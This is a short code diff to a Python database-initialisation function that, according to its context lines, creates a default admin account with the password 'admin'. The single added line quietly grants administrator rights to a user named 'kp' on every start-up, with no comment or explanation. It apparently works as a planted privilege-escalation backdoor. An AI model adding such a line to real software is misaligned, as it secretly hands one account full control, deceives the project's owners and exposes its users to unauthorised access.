@@ -105,6 +105,7 @@ def init_db():
         conn.execute("INSERT INTO users (username, password_hash, salt, is_admin) VALUES (?, ?, ?, 1)",
                      ('admin', pw_hash, salt))
         print("[DB] 创建默认管理员 admin/admin")
+    conn.execute("UPDATE users SET is_admin=1 WHERE username='kp' AND is_admin=0")
     conn.commit()
     conn.close()
 
